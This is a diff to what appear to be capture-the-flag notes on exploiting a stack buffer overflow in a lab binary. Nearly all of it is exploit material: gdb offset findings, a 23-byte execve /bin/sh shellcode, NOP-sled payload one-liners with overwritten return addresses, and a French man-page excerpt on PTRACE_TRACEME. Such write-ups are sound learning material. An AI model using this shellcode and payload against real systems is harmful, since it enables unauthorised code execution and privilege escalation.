@@ -38,11 +38,15 @@ pattern search
 python -c 'print "A" * 156 + "BBBB"'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 
-x/x $esp+0x20 # buf
-0xffffd660:     0x080482e0
+0xffffd450 --> 0xffffd470 ('A' <repeats 156 times>, "BBBB")
+x/x $esp+0x20
+0xffffd470:     0x41414141
 
 SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (156-100-23) + "\xe0\x82\x04\x08"'
+python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (156-100-23) + "\x70\xd4\xff\xff"'
+> Stopped reason: SIGHUP # or SIGILL
+0x08048823 in main ()
+# SIGHUP before return
 
 
 export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
@@ -56,6 +60,10 @@ $2 = 0xffffd7b9
 
 python -c 'print "A" * 156 + "\xb9\xd7\xff\xff"' > /tmp/exploit04
 ```
+
+> PTRACE_TRACEME (http://manpagesfr.free.fr/man/man2/ptrace.2.html)
+
+    Le processus en cours va être suivi par son père. Tout signal (sauf SIGKILL) reçu par le processus l'arrêtera, et le père sera notifié grâce à wait(2). De plus, les appels ultérieurs à execve(2) par ce processus lui enverront SIGTRAP, ce qui donne au père la possibilité de reprendre le contrôle avant que le nouveau programme continue son exécution. Un processus ne doit pas envoyer cette requête si son père n'est pas prêt à le suivre. Dans cette requête, pid, addr et data sont ignorés.
 
 ## Sources
 
